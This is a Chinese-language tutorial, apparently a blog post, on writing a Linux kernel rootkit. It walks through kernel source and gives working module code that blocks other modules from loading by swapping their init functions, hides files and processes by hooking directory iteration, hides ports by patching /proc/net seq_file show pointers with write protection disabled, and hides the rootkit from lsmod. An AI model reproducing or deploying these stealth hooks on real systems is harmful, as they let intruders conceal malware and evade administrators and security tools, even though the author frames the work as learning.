# linux的rootkit
相比较Windows而言，开源的linux下我们似乎可以做更多的有意思的事情，我这里的Rootkit其实不局限于留恶意后门，而是一种学习的态度探索在Linux下自己去“修改 | 劫持系统操作”。让系统具有我们自己的特色的。本文章的所有代码基于linux5.03内核的测试。
## 限制其他模块的载入
模块载入到执行的过程有一个chain的操作，涉及到消息通知；而在这之间，我们有机会修改。
+ 模块初始调用链

`init_module-> load_module -> prepare_coming_module、do_init_module ->`

而在prepare_coming_module里有一条通知处理链

`blocking_notifier_call_chain -> __blocking_notifier_call_chain -> notifier_call_chain -> notifier_call`

```
SYSCALL_DEFINE3(init_module, void __user *, umod,
        unsigned long, len, const char __user *, uargs)
{
    int err;
    struct load_info info = { };

    err = may_init_module();
    //........略去
    err = copy_module_from_user(umod, len, &info);
    if (err)
        return err;
    return load_module(&info, uargs, 0);
}

/* Allocate and load the module: note that size of section 0 is always
   zero, and we rely on this for optional sections. */
static int load_module(struct load_info *info, const char __user *uargs,
               int flags)
{
    struct module *mod;
    long err = 0;
    char *after_dashes;

    /*一些检查*/

    //
    err = prepare_coming_module(mod);
    if (err)
        goto bug_cleanup;

    trace_module_load(mod);
    /*our module's init function will be executed*/
    return do_init_module(mod);

    /*略.............*/
    return err;
}

static int prepare_coming_module(struct module *mod)
{
    int err;

    ftrace_module_enable(mod);
    err = klp_module_coming(mod);
    if (err)
        return err;
    /*notify chain*/
    /*blocking_notifier_call_chain -> __blocking_notifier_call_chain -> notifier_call_chain*/
    blocking_notifier_call_chain(&module_notify_list,
                     MODULE_STATE_COMING, mod);
    return 0;
}
```
模块通知的处理函数可以注册，和销毁。相关的结构体与函数。
```

struct notifier_block {
    notifier_fn_t notifier_call;        //最终模块通知处理的函数时调用这里
    struct notifier_block __rcu *next;
    int priority;
};

//注册通知处理模块

int
register_module_notifier(struct notifier_block *nb);
//销毁通知处理模块/
int
unregister_module_notifier(struct notifier_block *nb);
```
+ 实现思路
1、编写一个模块，注册通知处理函数
2、处理函数修改module的init函数为“什么也不做”
简单限制其他模块的载入实现
```

    int
    fake_init(void);
    void
    fake_exit(void);
    int
    module_notifier(struct notifier_block *nb,
                    unsigned long action, void* data);
    struct notifier_block nb = {
        .notifier_call = module_notifier,//自定义的通知处理函数
        .priority = INT_MAX,
    };

    int module_notifier(struct notifier_block *nb,
                    unsigned long action, void* data)
    {
        struct module *module;
        unsigned long flags;
        //定义一个锁
        DEFINE_SPINLOCK(module_notifier_spinlock);

        module = data;
        fm_alert(&quot;Processing the module: %sn&quot;, module-&gt;name);
        //保持中断锁
        spin_lock_irqsave(&amp;module_notifier_spinlock, flags);
        switch(module-&gt;state) {
            case MODULE_STATE_COMING:
            fm_alert(&quot;Replacding init and exit functions: %s.n&quot;,
                                    module-&gt;name);
                //换掉模块的初始化与退出函数
                module-&gt;init = fake_init;
                module-&gt;exit = fake_exit;
                break;
            default:
                break;
        }
        //解除锁
        spin_unlock_irqrestore(&amp;module_notifier_spinlock, flags);
        return NOTIFY_DONE;
    }

    static int 
    reg_notify_init(void)
    {
        register_module_notifier(&amp;nb);
        return 0;
    }

    static void reg_notify_exit(void)
    {
        unregister_module_notifier(&amp;nb);
    }


    int
    fake_init(void)
    {
        fm_alert(&quot;%sn&quot;, &quot;Fake init.n&quot;);
        return 0;
    }

    void
    fake_exit(void)
    {
        fm_alert(&quot;%sn&quot;, &quot;Fake exit.n&quot;);
        return ;
    }

    module_init(reg_notify_init);
    module_exit(reg_notify_exit);
```
效果演示：
![效果演示](_v_images/20191221082400267_8103.png)
## 隐藏文件
除了一般的内联HOOK甚至系统调用之外，我们可以从比较底层的kernel的数据结构入手。
阅读Linux相关源码fs/readdir.c，简单熟悉下系统是如何搜索文件的。
```
    SYSCALL_DEFINE3(old_readdir, unsigned int, fd,
            struct old_linux_dirent __user *, dirent, unsigned int, count)
    {
        //..........
        struct readdir_callback buf = {
            .ctx.actor = fillonedir,        //这是之后会调用的函数
            .dirent = dirent
        };
        //.......
        error = iterate_dir(f.file, &buf.ctx);    //交给iterate_dir函数
    }
```
iterate_dir函数的实现

这里比较坑，网上很多地方都是hook的iterate，我自己实现发现没能成功，用别人的代码也不行，就仔细看看了这段处理逻辑，发现一点玄机。主要是iterate_dir处理的时候，有两个函数指针，且有优先顺序。
```
    int iterate_dir(struct file *file, struct dir_context *ctx)
    {
        struct inode *inode = file_inode(file);
        bool shared = false;
        int res = -ENOTDIR;
        //注意这里
        if (file->f_op->iterate_shared)
            shared = true;
        //if operation->iterate_shared & iterate are null goto out
        else if (!file->f_op->iterate)
            goto out;
           //略
          //优先执行iterate_shared函数、其次是iterate
          //所以为了hook稳定性，我们可以iterate_shared
        if (!IS_DEADDIR(inode)) {
            ctx->pos = file->f_pos;
            if (shared)
                res = file->f_op->iterate_shared(file, ctx);
            else
               //here kernel find the file_context*/
               //who wiil call ctx->actor(filldir64)*/
                res = file->f_op->iterate(file, ctx);
            file->f_pos = ctx->pos;
            fsnotify_access(file);
            file_accessed(file);
        }
     
    }
    
```

EXPORT_SYMBOL(iterate_dir);
iterate最终是交给struct dir_context 结构的filldir来做的，把目录结构一个个的填充到缓冲区。

所以我们隐藏文件的思路就很明确了
1、修改iterate_shared指针到我们自己的iterate
2、修改filldir指针到我们自己的filldir，过滤我们不想输出的文件信息。
3、细节问题就是在module_init里修改，注意在module_exit里修复。不然会影响正常的工作。
hook部分代码
```
    int
    fake_iterate(struct file *filp, struct dir_context *ctx)
    {
        real_filldir = ctx->actor;
        *(filldir_t *)&ctx->actor = fake_filldir;
        printk("fake_iterate !n");
        return real_iterate(filp, ctx);
    }
    int
    fake_filldir(struct dir_context *ctx, const char *name, int namlen,
                 loff_t offset, u64 ino, unsigned d_type)
    {
        printk("fake_filldir!n");
        if (!strncmp(name, SECRET_FILE, strlen(name))) {
            fm_alert("Hiding: %sn", name);
            return 0;
        }
        return real_filldir(ctx, name, namlen, offset, ino, d_type);
    }
```
## 隐藏进程
Linux系统，一切皆文件，也就是说，我们隐藏需要隐藏的进程信息也是通过文件隐藏实现的。这一点，可以通过strace跟踪 ps系统调用来确定，最终是用到了getdents系统调用。
只需要将文件名这种，处理一下到pid即可。
```
    int
    fake_filldir(struct dir_context *ctx, const char *name, int namlen,
                 loff_t offset, u64 ino, unsigned d_type)
    {
        char* endp;
        long pid;
        printk("fake_filldir!n");
        printk("pid_information: %sn", name);
        pid = simple_strtol(name, &endp, 10);
        if (pid == SECRET_PROC) {
            fm_alert("Hiding: %sn", name);
            return 0;
        }
        return real_filldir(ctx, name, namlen, offset, ino, d_type);
    }
```
但是实际测试一下，发现这没有起作用，而且发现当我们勾去了整个根目录的时候，大部分在根目录的子目录，当我们执行ls 时，都会被勾去，但不部分目录如/proc和sys却没有。于是我吧勾取的目录改到了/proc。可以达到隐藏进程的目的。

## 隐藏端口
还是一切皆文件。。。端口信息是在/proc/net/下的，根据协议来分的。

1、/proc/net/tcp
2、/proc/net/tcp6
3、/proc/net/udp
4、/proc/net/udp6
然后，具体钩子的布置，看一下内核是怎么处理的。
```
    struct seq_file {
        char *buf;
        size_t size;
        size_t from;
        size_t count;
        size_t pad_until;
        loff_t index;
        loff_t read_pos;
        u64 version;
        struct mutex lock;
        const struct seq_operations *op;
        int poll_event;
        const struct file *file;
        void *private;
    };

    struct seq_operations {
        void * (*start) (struct seq_file *m, loff_t *pos);
        void (*stop) (struct seq_file *m, void *v);
        void * (*next) (struct seq_file *m, void *v, loff_t *pos);
        int (*show) (struct seq_file *m, void *v);
    };
```
seq_file类似于file结构，seq_operation结构类似于之前file_operation结构。show函数就是我们需要改写的。

这里从什么地方改写show，参考后面的第一个链接，发现不行。查阅了源码发现相关的结构有改动。我看到一个seq_read -> traverse -> show的调用链，做了些调整。
```
    ssize_t seq_read(struct file *file, char __user *buf, size_t size, loff_t *ppos)
    {
        struct seq_file *m = file->private_data;    //由file可得
        /* Don't assume *ppos is where we left it */
        if (unlikely(*ppos != m->read_pos)) {
            while ((err = traverse(m, *ppos)) == -EAGAIN)
                ;
    ..................
    }
    EXPORT_SYMBOL(seq_read);

    static int traverse(struct seq_file *m, loff_t offset)
    {
    ...................
        if (!m->buf) {
            m->buf = seq_buf_alloc(m->size = PAGE_SIZE);
            if (!m->buf)
                return -ENOMEM;
        }
        p = m->op->start(m, &m->index);
        while (p) {
            error = PTR_ERR(p);
            if (IS_ERR(p))
                break;
            error = m->op->show(m, p);/*由file 结构 访问 show()*/
               .....................
               pos += m->count;        /*更新下一次的buf起始地址*/
            m->count = 0;            /*count每次循环置0*/
    }
```
有个坑，就是注意到seq_file下的seq_operations是const，也就是只读的，没法直接赋值，所以我们需要指针的方式修改。具体代码如下
```
# define set_afinfo_seq_op(func, path, new, old)   
    do {                                                        
        struct file *filp;                                      
        struct seq_file *p;                                     
        unsigned long* tmp;                                        
        filp = filp_open(path, O_RDONLY, 0);                    
        if (IS_ERR(filp)) {                                     
            fm_alert("Failed to open %s with error %ld.n",     
                     path, PTR_ERR(filp));                      
            old = NULL;                                         
        }                                                       
        p = filp->private_data;                                    
        old = p->op->func;                                          
        fm_alert("Setting seq_op->" #func " from 0x%lx to 0x%lx.", 
                 old, new);                                     
        disable_wp();                                            
        tmp = (unsigned long*) &(p->op->func);                  
        *(tmp) = new;                                            
        enable_wp();                                            
                                                                
        filp_close(filp, 0);                                    
    } while (0)                                                    
```
具体的show怎么改写，可以先看看tcp_ipv4.c下的show是怎么实现的，我们只需要知道如何过滤即可。
```
    static int tcp4_seq_show(struct seq_file *seq, void *v)
    {
        struct tcp_iter_state *st;
        struct sock *sk = v;
        /*这里是为每一条记录设置填充长度，填充到TMPSZ（150）对齐*/
        seq_setwidth(seq, TMPSZ - 1);
        /*第一行的内容，标注每个字段的含义*/
        if (v == SEQ_START_TOKEN) {
            seq_puts(seq, "  sl  local_address rem_address   st tx_queue "
                   "rx_queue tr tm->when retrnsmt   uid  timeout "
                   "inode");
            goto out;
        }
        st = seq->private;
        /*分类处理*/
        if (sk->sk_state == TCP_TIME_WAIT)
            get_timewait4_sock(v, seq, st->num);
        else if (sk->sk_state == TCP_NEW_SYN_RECV)
            get_openreq4(v, seq, st->num);
        else
            get_tcp4_sock(v, seq, st->num);
    out:
        /*根据之前设置的填充长度，用空格填充，最后空行结束一条记录*/
        seq_pad(seq, 'n');
        return 0;
    }

    /*举一例*/
    static void get_timewait4_sock(const struct inet_timewait_sock *tw,
                       struct seq_file *f, int i)
    {
        long delta = tw->tw_timer.expires - jiffies;
        __be32 dest, src;
        __u16 destp, srcp;

        dest  = tw->tw_daddr;
        src   = tw->tw_rcv_saddr;
        destp = ntohs(tw->tw_dport);
        srcp  = ntohs(tw->tw_sport);
        /*这就是在缓冲区里填充的格式*/
        seq_printf(f, "%4d: %08X:%04X %08X:%04X"
            " %02X %08X:%08X %02X:%08lX %08X %5d %8d %d %d %pK",
            i, src, srcp, dest, destp, tw->tw_substate, 0, 0,
            3, jiffies_delta_to_clock_t(delta), 0, 0, 0, 0,
            refcount_read(&tw->tw_refcnt), tw);
    }
```
每一次向缓冲区输出时，都会更新seq->count的大小（缓冲区的长度），buf每次根据show结束的seq->count的大小，移动pos指针。所以我们只需要在show之后检查到了需要过滤的端口，将该条记录的长度减去就得了。

简单的fake_seq_show的代码
```
    int
    fake_seq_show(struct seq_file *seq, void *v)
    {    
        int ret;
        int last_len, this_len;
        //当前记录的长度
        last_len = seq->count;
        ret = real_seq_show(seq, v);
        this_len = seq->count - last_len;

        //判断是否存在我们需要过滤的端口信息
        if (strnstr(seq->buf + last_len, SECRET_MODULE, this_len)) {
            fm_alert("Hiding module: %sn", SECRET_MODULE);
        //删除记录
            seq->count -= this_len;
        }
        return ret;
    }
```
测试效果，以tcp6、22端口为例
![22](_v_images/20191221083033037_3408.png)
## 隐藏内核模块
模块的查看方式及来源

1、lsmod   来源于文件/proc/module
2、/sys/module  来源......就不用再说了吧
第二种就类似于文件隐藏，不多说

隐藏lsmod的查看，在于/proc/module，其实和上面二点隐藏端口的方式类似。

可以看一下系统处理的整个调用链，和端口的处理类似，一样用的seq_operation结构体，只是初始的函数指针不同。

所以我们可以使用和隐藏端口一样的方式来达到目的，只是入口的目录和过滤规则变了。

效果如下，隐藏了我们自己的module
![自己的module](_v_images/20191221083119700_8227.png)

## 其他应用综合参考文件
https://github.com/LibreCrops/documentation-zh_CN/blob/master/source/linux_rootkit.rst